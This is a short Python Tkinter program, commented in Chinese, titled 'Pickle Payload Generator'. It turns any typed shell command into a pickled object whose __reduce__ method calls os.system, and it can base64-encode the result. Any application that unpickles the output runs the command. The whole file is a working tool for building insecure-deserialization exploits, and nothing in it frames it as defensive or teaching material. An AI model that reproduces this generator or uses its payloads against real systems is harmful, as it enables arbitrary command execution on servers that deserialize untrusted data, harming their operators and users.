from tkinter import *
import pickle
import os
import base64

class Payload:
    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        return (os.system, (self.cmd,))

def generate_payload(cmd):
    # 根据命令创建Payload实例
    pl = Payload(cmd)
    serialized_payload = pickle.dumps(pl)
    if use_base64.get() == 1:
        return base64.b64encode(serialized_payload).decode('utf-8')
    else:
        return serialized_payload

def clicked():
    command = txt.get()  # 获取用户输入的命令
    payload_data = generate_payload(command)  # 生成payload
    lbl2.grid(column=1, row=5, padx=10, pady=10)  # 显示成功标签
    lbl3.config(state='normal')  # 允许修改文本
    lbl3.delete('1.0', END)  # 清除旧内容
    lbl3.insert('1.0', payload_data)  # 插入新的payload
    lbl3.config(state='disabled')  # 禁止修改
    print("Generated Payload:", payload_data)  # 打印生成的payload

window = Tk()
window.geometry("700x400")
window.title("Pickle Payload Generator")

# 为整个窗口设置居中对齐的列配置
window.columnconfigure(0, weight=1)
window.columnconfigure(2, weight=1)

# 添加一个突出显示的大标题
title = Label(window, text="Pickle Payload Generator", font=('Arial', 16, 'bold'))
title.grid(column=1, row=0, padx=10, pady=10)

# 使用更大的字体并居中放置标签
lbl1 = Label(window, text="请输入你的命令:", font=('Arial', 12))
lbl1.grid(column=1, row=1, padx=10, pady=10)

# 输入框，稍微增大字体大小
txt = Entry(window, font=('Arial', 10), width=40)
txt.grid(column=1, row=2, padx=10, pady=10)

# 创建复选框用于选择是否使用 Base64 编码
use_base64 = IntVar(value=1)  # Tkinter 变量来存储复选框的状态
chk = Checkbutton(window, text='使用Base64编码', var=use_base64, font=('Arial', 10))
chk.grid(column=1, row=3, padx=10, pady=10)

# 创建一个标签但初始不显示，等待点击按钮时显示
lbl2 = Label(window, text="Payload生成成功!", font=('Arial', 12), fg='green')

# 创建 Text 控件用于显示生成的payload
lbl3 = Text(window, height=4, width=50, font=('Arial', 12))
lbl3.grid(column=1, row=6, padx=10, pady=10)
lbl3.config(state='disabled')  # 初始设置为不可编辑状态

# 创建按钮，设置字体和颜色，并在第四行放置
btn = Button(window, text="生成Payload", command=clicked, font=('Arial', 12), bg='blue', fg='white')
btn.grid(column=1, row=4, padx=10, pady=10)

window.mainloop()
